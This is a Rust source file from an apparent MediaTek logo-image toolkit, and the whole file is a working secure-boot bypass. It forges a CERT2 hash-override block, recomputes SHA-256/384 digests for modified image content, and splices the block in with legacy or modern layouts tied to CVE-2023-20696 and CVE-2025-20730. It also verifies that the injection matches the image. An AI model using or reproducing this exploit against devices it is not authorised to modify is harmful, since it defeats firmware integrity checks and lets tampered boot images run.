// SPDX-License-Identifier: GPL-3.0-or-later
// mtk-logo-toolkit - MTK logo image toolchain
// Copyright (C) 2025 ELF-RC
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

//! CERT2 fake certificate injection and verification.
//!
//! Two bypass modes are supported:
//!
//! - **Legacy** (bypass_mode=1, `--legacy` or default): Prepends
//!   `BIT_STRING(original_DER) + 0xA0(hash_override)` before the original
//!   CERT2 blob. Old libsec enters the BIT STRING payload to find the
//!   original 0x30 SEQUENCE. (CVE-2023-20696)
//!
//! - **Modern** (`--modern`): Prepends only `0xA0(hash_override)` as a
//!   top-level sibling before the original CERT2 DER SEQUENCE. New libsec
//!   reads the 0xA0 override block directly. (CVE-2025-20730)

use crate::part_header;
use crate::asn1_der;
use sha2::{Sha256, Sha384, Digest};

/// Bypass mode for cert injection.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BypassMode {
    /// Legacy: `BIT_STRING(original_DER) + 0xA0(hash_override)` (bypass_mode=1).
    Legacy,
    /// Modern: `0xA0(hash_override)` as top-level sibling before original DER.
    Modern,
}

/// Determine the hash algorithm name from digest length.
fn algorithm_from_digest_length(len: usize) -> Option<&'static str> {
    match len {
        32 => Some("sha256"),
        48 => Some("sha384"),
        _ => None,
    }
}

/// Compute a hash digest of `data` using the named algorithm.
fn compute_hash_digest(data: &[u8], algorithm: &str) -> Vec<u8> {
    match algorithm {
        "sha256" => Sha256::digest(data).to_vec(),
        "sha384" => Sha384::digest(data).to_vec(),
        _ => panic!("unknown algorithm: {}", algorithm),
    }
}

/// Locate CERT2 and the target image part (the last non-cert part before CERT2).
///
/// Returns `(cert2_entry, target_part_entry)` where each entry is
/// `(part_index, header_offset, data_offset, header_ref)`.
fn locate_cert2_and_target(
    parts: &[part_header::ParsedPart],
) -> (
    Option<(usize, usize, usize, &part_header::PartHeader)>,
    Option<(usize, usize, usize, &part_header::PartHeader)>,
) {
    let mut cert2_entry = None;
    for (index, part) in parts.iter().enumerate() {
        if part.header.image_type == part_header::IMAGE_TYPE_CERT2 {
            cert2_entry = Some((index, part.header_offset, part.data_offset, &part.header));
            break;
        }
    }
    let cert2 = match cert2_entry {
        Some(c) => c,
        None => return (None, None),
    };
    let cert2_offset = cert2.1;
    let mut target_entry = None;
    for (index, part) in parts.iter().enumerate() {
        if part.header_offset < cert2_offset
            && (part.header.image_type & 0xFF00_0000) != part_header::IMAGE_TYPE_GROUP_CERT
        {
            target_entry = Some((index, part.header_offset, part.data_offset, &part.header));
        }
    }
    (Some(cert2), target_entry)
}

/// Extract the header bytes and padded data bytes that are inputs to the
/// image hash.
fn extract_hash_inputs(
    image: &[u8],
    target: &(usize, usize, usize, &part_header::PartHeader),
) -> (Vec<u8>, Vec<u8>) {
    let (_, header_offset, data_offset, header) = *target;
    let header_size = if header.header_size != 0 {
        header.header_size as usize
    } else {
        part_header::PART_HEADER_SIZE
    };
    let header_bytes = image[header_offset..header_offset + header_size].to_vec();
    let padded_data_size = header.padded_data_size();
    let data_bytes = image[data_offset..data_offset + padded_data_size].to_vec();
    (header_bytes, data_bytes)
}

/// Replace the CERT2 blob in the image with a new (potentially different-sized)
/// blob, updating `data_size` in the part header and preserving alignment padding.
fn splice_cert2_blob(
    image: &[u8],
    cert2_blob_offset: usize,
    cert2_header_offset: usize,
    cert2_header: &part_header::PartHeader,
    new_blob: &[u8],
) -> Vec<u8> {
    let new_data_size = new_blob.len();
    let old_padded_size = cert2_header.padded_data_size();
    let new_padded_size = part_header::round_up(new_data_size, cert2_header.align_size as usize);
    let padding = new_padded_size - new_data_size;

    let mut padded_blob = new_blob.to_vec();
    padded_blob.extend(std::iter::repeat(0u8).take(padding));

    let old_end = cert2_blob_offset + old_padded_size;
    let mut out = Vec::with_capacity(image.len() - old_padded_size + new_padded_size);
    out.extend_from_slice(&image[..cert2_blob_offset]);
    out.extend_from_slice(&padded_blob);
    if old_end < image.len() {
        out.extend_from_slice(&image[old_end..]);
    }
    out[cert2_header_offset + 4..cert2_header_offset + 8]
        .copy_from_slice(&(new_data_size as u32).to_le_bytes());
    out
}

/// Build the 0xA0 hash override block:
/// `A0 <len> [OID(header_hash) BIT_STRING(new_hdr_digest)] [OID(image_hash) BIT_STRING(new_img_digest)]`
fn build_hash_override_block(header_digest: &[u8], image_digest: &[u8]) -> Vec<u8> {
    let mut elements = Vec::new();
    elements.push(asn1_der::build_oid_tlv(asn1_der::OID_IMAGE_HEADER_HASH));
    elements.push(asn1_der::build_bit_string_tlv(header_digest));
    elements.push(asn1_der::build_oid_tlv(asn1_der::OID_IMAGE_HASH));
    elements.push(asn1_der::build_bit_string_tlv(image_digest));
    let mut inner = Vec::new();
    for element in &elements {
        inner.extend_from_slice(element);
    }
    let mut out = vec![0xA0];
    out.extend(asn1_der::encode_length(inner.len()));
    out.extend(inner);
    out
}

/// Inject a fake certificate into the image.
///
/// - `BypassMode::Legacy` (default): Prepends `BIT_STRING(original_DER) +
///   0xA0(hash_override)` before the original CERT2 blob.
/// - `BypassMode::Modern`: Prepends `0xA0(hash_override)` as a top-level
///   sibling before the original CERT2 DER SEQUENCE.
///
/// Both modes are idempotent: if a previous injection is detected, it is
/// stripped before re-injecting.
pub fn inject_fake_cert(image: &[u8], mode: BypassMode) -> anyhow::Result<Vec<u8>> {
    println!("Image: {} bytes  mode: {:?}", image.len(), mode);

    let parts = part_header::parse_all_parts(image);
    if parts.is_empty() {
        anyhow::bail!("no part_hdr_t headers found");
    }
    let (cert2_entry, target_entry) = locate_cert2_and_target(&parts);
    let cert2 = cert2_entry.ok_or_else(|| anyhow::anyhow!("CERT2 partition header not found"))?;
    let target = target_entry.ok_or_else(|| anyhow::anyhow!(
        "no target image partition found before CERT2; cannot compute hashes"
    ))?;

    let (_, cert2_hdr_offset, cert2_blob_offset, cert2_header) = cert2;
    let der_blob = &image[cert2_blob_offset..cert2_blob_offset + cert2_header.data_size as usize];
    println!(
        "CERT2: hdr_off=0x{:08x}  blob_off=0x{:08x}  dsize={}",
        cert2_hdr_offset, cert2_blob_offset, cert2_header.data_size
    );

    // Idempotent: strip any previous injection.
    let original_der = asn1_der::strip_injection(der_blob);
    let original_der: &[u8] = original_der.as_ref();
    if original_der.len() != der_blob.len() {
        println!(
            "[INFO] existing injection detected and stripped ({} bytes); will re-inject",
            der_blob.len() - original_der.len()
        );
    }

    // For legacy mode, we need the original CERT2 DER SEQUENCE (0x30) to wrap.
    // For modern mode, we inject directly into the root SEQUENCE.
    let (original_cert2_der, original_relative_offset) =
        asn1_der::find_original_cert2_sequence(original_der)?;
    println!(
        "Original CERT2 DER at rel=0x{:x}, size={}",
        original_relative_offset, original_cert2_der.len()
    );

    // Identify hash algorithm from the original DER.
    let header_hash_bit = asn1_der::find_bit_string_after_oid(original_der, asn1_der::OID_IMAGE_HEADER_HASH);
    let image_hash_bit  = asn1_der::find_bit_string_after_oid(original_der, asn1_der::OID_IMAGE_HASH);
    let (header_hash_bit, image_hash_bit) = match (header_hash_bit, image_hash_bit) {
        (Some(h), Some(i)) if !h.is_empty() && !i.is_empty() => (h, i),
        _ => anyhow::bail!("Image Header Hash / Image Hash OID not found in CERT2"),
    };
    let old_header_digest = &header_hash_bit[1..];
    let old_image_digest  = &image_hash_bit[1..];
    let algorithm = algorithm_from_digest_length(old_header_digest.len())
        .or_else(|| algorithm_from_digest_length(old_image_digest.len()))
        .ok_or_else(|| anyhow::anyhow!(
            "cannot identify hash algorithm (header len={}, image len={})",
            old_header_digest.len(), old_image_digest.len()
        ))?;

    // Compute new hashes for the current image content.
    let (header_bytes, data_bytes) = extract_hash_inputs(image, &target);
    let new_header_digest = compute_hash_digest(&header_bytes, algorithm);
    let new_image_digest  = compute_hash_digest(&data_bytes, algorithm);

    println!("Algorithm: {}", algorithm);
    println!("  old header hash: {}", hex::encode(old_header_digest));
    println!("  new header hash: {}", hex::encode(&new_header_digest));
    println!("  old image  hash: {}", hex::encode(old_image_digest));
    println!("  new image  hash: {}", hex::encode(&new_image_digest));

    let override_block = build_hash_override_block(&new_header_digest, &new_image_digest);
    println!("Override block 0xA0: {} bytes", override_block.len());

    let new_blob = match mode {
        BypassMode::Legacy => {
            // Legacy: BIT STRING(original DER) + 0xA0(override) + original DER
            let wrapper_block = asn1_der::build_bit_string_tlv(original_cert2_der);
            println!("Legacy BIT STRING wrapper: {} bytes", wrapper_block.len());
            let mut blob = Vec::new();
            blob.extend_from_slice(&wrapper_block);
            blob.extend_from_slice(&override_block);
            blob.extend_from_slice(original_der);
            blob
        }
        BypassMode::Modern => {
            // Modern: 0xA0(override) as top-level sibling before original DER.
            // This matches sign_mtk_cert.py's approach: prefix_blocks + der
            let mut blob = Vec::new();
            blob.extend_from_slice(&override_block);
            blob.extend_from_slice(original_der);
            blob
        }
    };

    let output = splice_cert2_blob(
        image, cert2_blob_offset, cert2_hdr_offset, cert2_header, &new_blob
    );
    let new_padded = part_header::round_up(new_blob.len(), cert2_header.align_size as usize);
    println!(
        "New CERT2 dsize={}  padded={}  align={}",
        new_blob.len(), new_padded, cert2_header.align_size
    );
    Ok(output)
}

/// Verify that a fake cert is installed and the injected hashes match the
/// current image content. Auto-detects legacy vs modern layout.
pub fn verify_fake_cert(image: &[u8], image_name: &str) -> anyhow::Result<()> {
    println!("Image: {}  Size: {} bytes", image_name, image.len());
    let parts = part_header::parse_all_parts(image);
    if parts.is_empty() {
        println!("[ERROR] no part_hdr_t headers found");
        std::process::exit(1);
    }
    let (cert2_entry, target_entry) = locate_cert2_and_target(&parts);
    let cert2 = match cert2_entry {
        Some(c) => c,
        None => {
            println!("[ERROR] CERT2 partition header not found");
            std::process::exit(1);
        }
    };
    let target = match target_entry {
        Some(t) => t,
        None => {
            println!("[ERROR] no target image partition found before CERT2");
            std::process::exit(1);
        }
    };

    let (_, cert2_hdr_offset, cert2_blob_offset, cert2_header) = cert2;
    let der_blob = &image[cert2_blob_offset..cert2_blob_offset + cert2_header.data_size as usize];

    // Auto-detect layout: check if first TLV is BIT STRING (legacy) or 0xA0 (modern).
    let first_tlv = match asn1_der::parse_first_tlv(der_blob) {
        Some(f) => f,
        None => {
            println!(
                "[FAIL] cannot parse CERT2 blob at hdr_off=0x{:08x} - no valid TLV",
                cert2_hdr_offset
            );
            std::process::exit(1);
        }
    };

    let is_legacy_bitstring = first_tlv.0 == 0 && first_tlv.2 == 3; // universal BIT STRING
    let is_top_level_override = first_tlv.0 == 2 && first_tlv.1 && first_tlv.2 == 0; // ctx cons tag 0

    if is_legacy_bitstring {
        verify_legacy_layout(der_blob, cert2_hdr_offset, image, &target, first_tlv);
    } else if is_top_level_override {
        // Modern mode: 0xA0 override block as top-level sibling before original DER.
        // This is the same structure as the override in legacy mode, just without
        // the preceding BIT STRING wrapper.
        verify_override_layout(der_blob, cert2_hdr_offset, image, &target, first_tlv);
    } else {
        // No injection detected — could be original unmodified image
        println!(
            "[FAIL] no fake cert detected at CERT2 (hdr_off=0x{:08x}) - first tag is class={} num={}",
            cert2_hdr_offset, first_tlv.0, first_tlv.2
        );
        std::process::exit(1);
    }
    Ok(())
}

/// Verify legacy layout: BIT STRING(wrapper) + 0xA0(override) + original DER
fn verify_legacy_layout(
    der_blob: &[u8],
    cert2_hdr_offset: usize,
    image: &[u8],
    target: &(usize, usize, usize, &part_header::PartHeader),
    first_tlv: (u8, bool, u32, usize, usize),
) {
    let wrapper_size = first_tlv.4;
    let after_wrapper = &der_blob[first_tlv.4..];
    let second_tlv = match asn1_der::parse_first_tlv(after_wrapper) {
        Some(s) => s,
        None => {
            println!(
                "[FAIL] legacy BIT STRING present ({} bytes) but no 0xA0 override block after it",
                wrapper_size
            );
            std::process::exit(1);
        }
    };
    let is_override = second_tlv.0 == 2 && second_tlv.1 && second_tlv.2 == 0;
    if !is_override {
        println!(
            "[FAIL] legacy BIT STRING present ({} bytes) but no 0xA0 override block after it",
            wrapper_size
        );
        std::process::exit(1);
    }
    let override_size = second_tlv.4;

    let override_content = &after_wrapper[second_tlv.3..second_tlv.4];
    verify_override_block(
        override_content,
        cert2_hdr_offset,
        image,
        target,
        "legacy",
        wrapper_size,
        override_size,
    );
}

/// Verify modern layout: 0xA0(override) as top-level sibling, then original DER.
/// This is simpler than legacy — no BIT STRING wrapper, just the override block
/// directly prepended.
fn verify_override_layout(
    der_blob: &[u8],
    cert2_hdr_offset: usize,
    image: &[u8],
    target: &(usize, usize, usize, &part_header::PartHeader),
    first_tlv: (u8, bool, u32, usize, usize),
) {
    let override_size = first_tlv.4;
    let override_content = &der_blob[first_tlv.3..first_tlv.4];
    verify_override_block(
        override_content,
        cert2_hdr_offset,
        image,
        target,
        "modern",
        0, // no wrapper in modern mode
        override_size,
    );
}

/// Shared logic: extract hashes from override block and compare with current image.
fn verify_override_block(
    override_content: &[u8],
    cert2_hdr_offset: usize,
    image: &[u8],
    target: &(usize, usize, usize, &part_header::PartHeader),
    mode_label: &str,
    wrapper_size: usize,
    override_size: usize,
) {
    let injected_header_hash = asn1_der::find_bit_string_after_oid(override_content, asn1_der::OID_IMAGE_HEADER_HASH);
    let injected_image_hash  = asn1_der::find_bit_string_after_oid(override_content, asn1_der::OID_IMAGE_HASH);
    let (injected_header_hash, injected_image_hash) = match (injected_header_hash, injected_image_hash) {
        (Some(h), Some(i)) if !h.is_empty() && !i.is_empty() => (h, i),
        _ => {
            println!(
                "[FAIL] 0xA0 override block present ({} bytes) but missing header/image hash OID",
                override_size
            );
            std::process::exit(1);
        }
    };
    let injected_header_digest = &injected_header_hash[1..];
    let injected_image_digest  = &injected_image_hash[1..];
    let algorithm = match algorithm_from_digest_length(injected_header_digest.len()) {
        Some(a) => a,
        None => {
            println!(
                "[FAIL] cannot identify injected hash algorithm (length {})",
                injected_header_digest.len()
            );
            std::process::exit(1);
        }
    };

    let (header_bytes, data_bytes) = extract_hash_inputs(image, target);
    let current_header_digest = compute_hash_digest(&header_bytes, algorithm);
    let current_image_digest  = compute_hash_digest(&data_bytes, algorithm);

    println!("CERT2 hdr_off=0x{:08x}  {} layout detected", cert2_hdr_offset, mode_label);
    if wrapper_size > 0 {
        println!("  BIT STRING wrapper: {} bytes", wrapper_size);
    }
    println!("  0xA0 override block: {} bytes", override_size);
    println!("Algorithm: {}", algorithm);
    println!("  injected header hash: {}", hex::encode(injected_header_digest));
    println!("  current  header hash: {}", hex::encode(&current_header_digest));
    println!("  injected image  hash: {}", hex::encode(injected_image_digest));
    println!("  current  image  hash: {}", hex::encode(&current_image_digest));

    let header_match = injected_header_digest == current_header_digest.as_slice();
    let image_match  = injected_image_digest == current_image_digest.as_slice();
    if header_match && image_match {
        println!("[OK] fake cert installed ({}) and hashes match current image content (valid)", mode_label);
    } else {
        println!("[WARN] fake cert installed ({}) but hashes do not match current image content (content changed, re-install needed)", mode_label);
        if !header_match { println!("  - header hash mismatch"); }
        if !image_match  { println!("  - image hash mismatch"); }
        std::process::exit(1);
    }
}